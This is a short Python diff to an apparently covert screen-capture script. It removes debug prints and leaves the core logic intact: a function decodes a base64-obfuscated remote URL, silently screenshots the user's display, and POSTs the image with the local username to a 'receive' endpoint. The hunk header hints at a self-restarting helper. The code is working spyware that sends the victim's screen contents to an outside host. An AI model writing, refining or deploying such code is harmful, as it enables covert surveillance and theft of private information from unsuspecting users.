@@ -25,14 +25,11 @@ def restartafterdelay(t, file=__file__):
 def a():
     u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
     if pre := hasattr(request(u, method='HEAD'),"getcode"):
-        print(pre)
         return
     try:
         img = pyscreeze.screenshot()
-        print('e')
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
-        print('e')
         with open('tmp.png', 'rb') as imgbytes:
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
     except Exception as e:
